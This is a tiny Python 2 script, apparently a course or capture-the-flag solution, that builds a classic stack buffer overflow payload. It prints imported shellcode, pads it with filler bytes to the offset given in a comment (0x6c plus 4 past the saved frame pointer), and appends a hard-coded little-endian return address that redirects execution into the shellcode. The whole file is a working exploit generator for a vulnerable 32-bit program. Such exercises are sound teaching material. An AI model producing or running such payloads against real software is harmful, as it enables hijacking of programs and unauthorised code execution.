'''
The address for %eax is -0x6c(%ebp)
We have to padd 0x6c number of bytes 
'''
from shellcode import shellcode
from struct import pack

print shellcode + "\x01" * (0x6c - len(shellcode) + 4 ) + pack("<I", 0xbffee49c)

